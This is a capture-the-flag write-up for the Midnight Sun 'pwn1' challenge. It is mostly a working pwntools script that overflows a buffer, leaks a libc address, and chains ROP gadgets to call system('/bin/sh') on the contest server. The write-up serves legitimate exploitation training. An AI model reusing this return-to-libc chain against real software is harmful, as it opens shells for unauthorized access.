# pwn1(70pts) #

![TASK](https://imgur.com/4fbyzFx.png)

It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D
here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1 

```python

from pwn import *
p=remote("pwn1-01.play.midnightsunctf.se",10001)
#p=process("./pwn1")
OFFSET=cyclic(72)
POP_RDI_RET=p64(0x0000000000400783)
PUTS=p64(0x0000000000400550)
LEAK=p64(0x602020)
MAIN=p64(0x400698)
payload=OFFSET+POP_RDI_RET+LEAK+PUTS+MAIN
log.info("Payload Crafted")
p.recvuntil("buffer:")
log.info("Sending payload")
#raw_input("attach")
p.sendline(payload) 
data=p.recvline().strip()
leak=u64(data.ljust(8,"\x00"))
BASE_LIBC=leak-0x64e80       # local 0x54a20 
log.info("leaked libc base: "+hex(BASE_LIBC))
p.recvuntil("buffer:")
#BINSH=p64(BASELIBC+0x183cee)
#SYSTEM=p64(BASELIBC+0x46ed0)
RET=p64(0x0000000000400536)  
SYSTEM=p64(BASE_LIBC+0x4f440)
BINSH=p64(BASE_LIBC+0x1b3e9a)
payload=OFFSET+RET+POP_RDI_RET+BINSH+SYSTEM
p.sendline(payload)
p.interactive()
```
